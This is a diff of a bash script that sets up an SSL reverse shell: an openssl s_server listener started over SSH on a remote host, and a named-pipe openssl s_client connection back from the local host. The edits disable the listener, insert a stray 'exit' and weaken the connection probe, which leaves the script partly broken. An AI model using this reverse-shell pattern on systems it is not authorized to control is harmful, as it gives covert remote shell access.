@@ -18,14 +18,18 @@ else
 fi
 
 #Make sure there are no previous sessions running!
-echo -e "${BYELLOW}Making sure there are no previous sessions active...${NOCOLOR}"
-ssh -t -p $sshport -l $sshuser $rhost "screen -ls | grep listener_$cname | cut -d '.' -f 1 | xargs kill -9 2>/dev/null && screen -wipe"
+echo -e "${BYELLOW}Making sure there are no previous sessions active sessions...${NOCOLOR}"
+ssh -t -p $sshport -l $sshuser $rhost "screen -ls | grep listener_$cname | cut -d '.' -f 1 | xargs kill -9 ; screen -wipe"
 
+echo -e "${BYELLOW}Starting listener on receiving host...${NOCOLOR}"
 #Start the listener (with ssl) on our remote(receiver) host via ssh and log everything to a temp file for external probing
-ssh -t -p $sshport -l $sshuser $rhost "rm -f /tmp/reverselistener_$cname; screen -dmS listener_$cname; screen -S listener_$cname -X stuff \"openssl s_server -quiet -key ~/.ReverseShell/$cname/key.pem -cert ~/.ReverseShell/$cname/cert.pem -port $rport | tee /tmp/reverselistener_$cname\"`echo -ne '\015'`"
+ssh -t -p $sshport -l $sshuser $rhost "rm -f /tmp/reverselistener_$cname ; screen -dmS listener_$cname"
 
+#ssh -t -p $sshport -l $sshuser $rhost "screen -S listener_$cname -X stuff \"openssl s_server -quiet -key ~/.ReverseShell/$cname/key.pem -cert ~/.ReverseShell/$cname/cert.pem -port $rport | tee /tmp/reverselistener_$cname \" $(echo -ne '\015')"
+
+exit
 #Keep it clean.
-rm -f /tmp/reversesocket_$cname 2> /dev/null
+rm -f $installdir/reversesocket_$cname 2> /dev/null
 
 #Connect to our listener from our current host
 mkfifo $installdir/reversesocket_$cname
@@ -34,7 +38,7 @@ mkfifo $installdir/reversesocket_$cname
 sleep 1
 
 #Do a connection probe to see we connected the right hosts.###################################################################################################################
-probe=$(strings /dev/urandom | grep -o '[[:alnum:]]' | head -n 30 | tr -d '\n'; echo)
+probe=$(echo $RANDOM)
 echo -e "${BYELLOW}Testing/Validating connection...${NOCOLOR}"
 #send the unique probe via SSL
 echo "$probe" | openssl s_client -quiet -connect $rhost:$rport &
@@ -48,8 +52,8 @@ kill -9 $probejob
 probe2=$(ssh -t -p $sshport -l $sshuser $rhost "tail -n1 /tmp/reverselistener_$cname")
 
 #Clean up SSL escape chars
-probe=$(echo $probe | tr -dc '[:print:]')
-probe2=$(echo $probe2 | tr -dc '[:print:]')
+probe=$(echo $probe)
+probe2=$(echo $probe2)
 echo "ssl probedata: $probe"
 echo "ssh probedata: $probe2"
 
